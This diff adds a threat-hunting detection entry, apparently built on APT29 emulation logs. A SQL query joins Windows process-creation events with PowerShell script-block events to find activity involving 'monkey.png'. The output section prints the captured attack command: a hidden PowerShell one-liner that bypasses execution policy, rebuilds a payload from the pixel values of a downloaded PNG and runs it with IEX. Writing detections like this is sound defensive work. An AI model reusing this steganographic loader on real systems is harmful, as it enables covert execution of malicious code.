@@ -1,0 +1,30 @@
+# 94F9B4F2-1C52-4A47-BF47-C786513A05AA
+
+## Data Sources
+* Security<br>* Microsoft-Windows-PowerShell/Operational<br>
+
+## Logic
+
+```
+SELECT d.NewProcessName, d.CommandLine, c.ScriptBlockText
+FROM apt29Table c
+INNER JOIN (
+    SELECT NewProcessName, CommandLine, split(NewProcessId, '0x')[1] as NewProcessId
+    FROM apt29Table
+    WHERE LOWER(Channel) = "security"
+        AND EventID = 4688
+    ) d
+ON LOWER(hex(c.ExecutionProcessID)) = d.NewProcessId
+WHERE c.Channel = "Microsoft-Windows-PowerShell/Operational"
+    AND c.EventID = 4104
+    AND LOWER(c.ScriptBlockText) LIKE "%monkey.png%"
+
+```
+
+## Output
+
+```
+NewProcessName  | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                                                                                                                                                                                                                                                                                                                                                                     
+CommandLine     | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))" 
+ScriptBlockText | sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))
+```
